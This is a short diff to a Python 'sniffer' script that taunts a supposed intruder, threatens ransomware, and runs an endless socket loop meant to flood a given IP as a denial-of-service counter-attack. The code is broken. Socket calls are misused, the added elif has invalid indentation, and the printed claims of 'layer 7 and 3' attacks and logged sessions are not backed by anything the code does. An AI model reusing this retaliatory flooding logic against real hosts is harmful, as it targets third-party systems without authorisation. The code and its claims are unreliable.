@@ -11,8 +11,6 @@ a ransomware as well for the damage you did on my network.
 
 Enjoy it! :)
 
-~Mr Digital
-
 """)
 class Start_Sniffer():
     name , IP = sys.argv
@@ -57,7 +55,7 @@ class Start_Sniffer():
 [*] TIME IS UP... FORGOT TO TELL YOU, THE SESSION WAS LOGGED AND A DENIAL OF SERVICE IS LAUNCHED.
             """)
             while True:
-                sock.connect(IP , port)
+                sock.connect_ex(IP , port)
                 sock.send("HTTP 1/1 NOTIFY")
                 sock.close()
                 print("[+] IF THAT WASN'T ENOUGH HERE IS MORE :)")
@@ -65,6 +63,9 @@ class Start_Sniffer():
                 if sock.listen() == 0:
                     print("[+] SERVER SHUTTING DOWN")
                     sock.close()
+                    elif sock.listen() == 1:
+                        print("[!] One more hacker left, Performing Denial Of Service layer 7 and 3 attacks")
+             
 starter = Start_Sniffer()
 starter.Sniff()
 starter.script_start()
